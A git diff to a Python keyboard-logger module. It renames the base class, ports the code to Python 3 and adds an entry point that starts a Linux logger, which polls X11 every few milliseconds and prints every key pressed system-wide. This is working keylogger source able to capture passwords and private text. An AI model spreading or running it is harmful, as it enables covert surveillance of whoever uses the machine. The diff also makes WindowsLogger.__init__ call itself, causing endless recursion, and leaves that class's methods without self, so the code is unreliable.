@@ -2,7 +2,8 @@ from abc import ABCMeta, abstractmethod
 from singleton.singleton import ThreadSafeSingleton
 import threading
 
-class ALogger(object):
+
+class BaseLogger(object):
 
     __metaclass__ = ABCMeta
 
@@ -29,7 +30,7 @@ class ALogger(object):
         self.log_forever()
 
 @ThreadSafeSingleton
-class LinuxLogger(ALogger):
+class LinuxLogger(BaseLogger):
 
     import sys
     import ctypes as ct
@@ -144,7 +145,7 @@ class LinuxLogger(ALogger):
     }
 
     def __init__(self):
-        ALogger.__init__(self)
+        BaseLogger.__init__(self)
 
     def _fetch_keys_raw(self):
         self.x11.XQueryKeymap(self.display, self.keyboard)
@@ -155,7 +156,7 @@ class LinuxLogger(ALogger):
 
         # check modifier states (ctrl, alt, shift keys)
         modifier_state = {}
-        for mod, (i, byte) in self.modifiers.iteritems():
+        for mod, (i, byte) in self.modifiers.items():
             modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)
 
         # shift pressed?
@@ -173,7 +174,7 @@ class LinuxLogger(ALogger):
         for i, k in enumerate(keypresses_raw):
             o = ord(k)
             if o:
-                for byte,key in self.key_mapping.get(i, {}).iteritems():
+                for byte,key in self.key_mapping.get(i, {}).items():
                     if byte & o:
                         if isinstance(key, tuple): key = key[shift or self.caps_lock_state]
                         pressed.append(key)
@@ -197,16 +198,20 @@ class LinuxLogger(ALogger):
         while True:
             sleep(.005)
             changed, modifiers, keys = self._fetch_keys()
-            if changed: print "%.2f   %r   %r" % (time(), modifiers, keys)
+            if changed: print("%.2f   %r   %r" % (time(), modifiers, keys))
 
 @ThreadSafeSingleton
-class WindowsLogger(ALogger):
+class WindowsLogger(BaseLogger):
 
     def __init__(self):
-        ALogger.__init__(self)
+        WindowsLogger.__init__(self)
 
     def _fetch_keys():
         pass
 
     def log_forever():
         pass
+
+if __name__ == '__main__':
+    logger = LinuxLogger.instance()
+    logger.log_forever()
